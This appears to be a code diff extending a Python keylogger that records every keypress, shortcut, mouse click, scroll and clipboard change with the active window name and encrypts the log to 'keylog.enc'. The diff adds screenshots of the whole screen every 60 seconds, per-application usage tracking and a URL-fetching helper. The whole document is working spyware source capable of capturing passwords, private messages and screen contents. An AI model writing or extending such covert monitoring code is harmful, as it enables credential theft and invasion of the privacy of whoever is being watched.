@@ -5,9 +5,11 @@ import logging
 import time
 import threading
 import re
-from collections import deque
+from collections import deque, defaultdict
 from cryptography.fernet import Fernet
 from pynput import keyboard, mouse
+from PIL import ImageGrab
+import requests
 
 # Windows-specific imports
 if platform.system() == "Windows":
@@ -20,7 +22,6 @@ if platform.system() == "Windows":
 # Optional clipboard monitoring
 try:
     import pyperclip
-
     clipboard_available = True
 except ImportError:
     clipboard_available = False
@@ -44,31 +45,24 @@ active_window_name = None
 active_window_start_time = time.time()
 pressed_keys = set()
 clipboard_content = None  # For clipboard changes
-
+usage_stats = defaultdict(float)  # For application usage statistics
 
 def get_active_window_process_name() -> str:
-    """
-    Returns the active window's process name and title.
-    On Windows, uses win32 APIs; otherwise, returns the current process name.
-    """
+    """Returns the active window's process name and title."""
     try:
         if platform.system() == "Windows":
             window_handle = win32gui.GetForegroundWindow()
             window_title = win32gui.GetWindowText(window_handle)
             _, pid = win32process.GetWindowThreadProcessId(window_handle)
             process = psutil.Process(pid)
-            process_name = process.name()
-            return f"{process_name} - {window_title}"
+            return f"{process.name()} - {window_title}"
         else:
-            process = psutil.Process(os.getpid())
-            return process.name()
+            return psutil.Process(os.getpid()).name()
     except Exception as e:
         logging.error(f"Error getting active window process name: {e}")
         return "Unknown"
 
-
 active_window_name = get_active_window_process_name()
-
 
 def log_event(message: str) -> None:
     """Append a message to the log buffer and flush if necessary."""
@@ -76,19 +70,17 @@ def log_event(message: str) -> None:
     if len(log_buffer) >= 10:
         flush_log_buffer()
 
-
 def flush_log_buffer() -> None:
     """Write all buffered events to the log file."""
     with open("keylog.txt", "a") as log_file:
         while log_buffer:
             log_file.write(log_buffer.popleft() + "\n")
 
-
 def log_time_spent_on_window(window_name: str, start_time: float) -> None:
-    """Log the time spent on a given window."""
+    """Log the time spent on a given window and update usage statistics."""
     time_spent = time.time() - start_time
+    usage_stats[window_name] += time_spent
     log_event(f"Time spent on {window_name}: {time_spent:.2f} seconds")
-
 
 def handle_window_change() -> None:
     """Check if the active window has changed and log the time spent on the previous one."""
@@ -99,7 +91,6 @@ def handle_window_change() -> None:
         active_window_name = new_window_name
         active_window_start_time = time.time()
 
-
 def on_press(key) -> None:
     """Handle key press events."""
     try:
@@ -108,7 +99,6 @@ def on_press(key) -> None:
         log_event(f"Key pressed: {key} in {active_window_name}")
     except Exception as e:
         logging.error(f"Error in on_press: {e}")
-
 
 def on_release(key) -> None:
     """Handle key release events and capture text input."""
@@ -132,13 +122,11 @@ def on_release(key) -> None:
         if pressed_keys:
             log_event(f"Shortcut used: {', '.join(str(k) for k in pressed_keys)} in {active_window_name}")
 
-        # Stop listeners on pressing escape
         if key == keyboard.Key.esc:
             stop_listeners()
             return False
     except Exception as e:
         logging.error(f"Error in on_release: {e}")
-
 
 def on_click(x: int, y: int, button, pressed: bool) -> None:
     """Handle mouse click events."""
@@ -149,7 +137,6 @@ def on_click(x: int, y: int, button, pressed: bool) -> None:
     except Exception as e:
         logging.error(f"Error in on_click: {e}")
 
-
 def on_scroll(x: int, y: int, dx: int, dy: int) -> None:
     """Handle mouse scroll events."""
     try:
@@ -157,7 +144,6 @@ def on_scroll(x: int, y: int, dx: int, dy: int) -> None:
         log_event(f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy}) in {active_window_name}")
     except Exception as e:
         logging.error(f"Error in on_scroll: {e}")
-
 
 def stop_listeners() -> None:
     """Stop all listeners and signal the clipboard thread to stop."""
@@ -170,7 +156,6 @@ def stop_listeners() -> None:
     except Exception as e:
         logging.error(f"Error stopping listeners: {e}")
 
-
 def on_key_combination(key) -> None:
     """Stop listeners if Ctrl+C is detected."""
     try:
@@ -180,13 +165,11 @@ def on_key_combination(key) -> None:
     except Exception as e:
         logging.error(f"Error in on_key_combination: {e}")
 
-
 def periodic_flush() -> None:
     """Flush the log buffer to disk every 10 seconds."""
     while True:
         time.sleep(10)
         flush_log_buffer()
-
 
 def log_active_window() -> None:
     """Log the active window every 5 seconds."""
@@ -194,7 +177,6 @@ def log_active_window() -> None:
         time.sleep(5)
         handle_window_change()
         log_event(f"Active window: {active_window_name}")
-
 
 def monitor_clipboard() -> None:
     """Monitor clipboard changes and log them."""
@@ -211,6 +193,36 @@ def monitor_clipboard() -> None:
         except Exception as e:
             logging.error(f"Error monitoring clipboard: {e}")
 
+def capture_screenshot() -> None:
+    """Capture a screenshot and save it to a file."""
+    try:
+        screenshot = ImageGrab.grab()
+        timestamp = time.strftime("%Y%m%d-%H%M%S")
+        screenshot.save(f"screenshot_{timestamp}.png")
+        log_event(f"Screenshot captured: screenshot_{timestamp}.png")
+    except Exception as e:
+        logging.error(f"Error capturing screenshot: {e}")
+
+def periodic_screenshot_capture(interval: int = 60) -> None:
+    """Capture screenshots at regular intervals."""
+    while True:
+        time.sleep(interval)
+        capture_screenshot()
+
+def log_network_activity(url: str) -> None:
+    """Log network activity such as visited URLs."""
+    try:
+        response = requests.get(url)
+        log_event(f"Visited URL: {url} - Status Code: {response.status_code}")
+    except Exception as e:
+        logging.error(f"Error logging network activity: {e}")
+
+def display_usage_statistics() -> None:
+    """Display the application usage statistics."""
+    print("\n--- Application Usage Statistics ---\n")
+    for window, duration in usage_stats.items():
+        print(f"{window}: {duration:.2f} seconds")
+    print("\n--- End of Statistics ---\n")
 
 # --- Set up Listeners and Threads ---
 try:
@@ -242,6 +254,9 @@ if clipboard_available:
     clipboard_thread.do_run = True
     clipboard_thread.start()
 
+screenshot_thread = threading.Thread(target=periodic_screenshot_capture, daemon=True)
+screenshot_thread.start()
+
 # Main loop: block until listeners are stopped
 try:
     keyboard_listener.join()
@@ -249,6 +264,7 @@ try:
     key_combination_listener.join()
     if clipboard_available:
         clipboard_thread.join()
+    screenshot_thread.join()
 except Exception as e:
     logging.error(f"Error joining listeners: {e}")
 
@@ -265,3 +281,6 @@ try:
     print("Log file encrypted as 'keylog.enc'.")
 except Exception as e:
     logging.error(f"Error encrypting log file: {e}")
+
+# Display usage statistics
+display_usage_statistics()
